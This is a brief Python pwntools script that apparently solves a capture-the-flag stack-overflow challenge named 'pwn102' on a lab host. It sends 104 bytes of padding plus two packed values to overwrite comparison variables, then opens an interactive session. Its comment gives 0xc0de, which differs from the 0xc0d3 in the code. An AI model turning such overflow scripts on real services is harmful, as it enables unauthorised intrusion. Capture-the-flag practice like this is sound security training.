#!/usr/bin/env python3
# this challenge need to overwrite variable 0xbadf00d and 0xfee1dead with 0xc0de and 0xc0ff33.

from pwn import *

host = "10.10.26.110"
port = 9002

context.log_level = 'debug'

#p = process("./pwn102")
p = remote(host,port)

payload = flat(
    b"A" * 104,         # junk
    p32(0xc0d3),		# second compare value
    p32(0xc0ff33)		# first compare value
)

p.sendlineafter(b"?", payload)
p.recvline()

p.interactive()


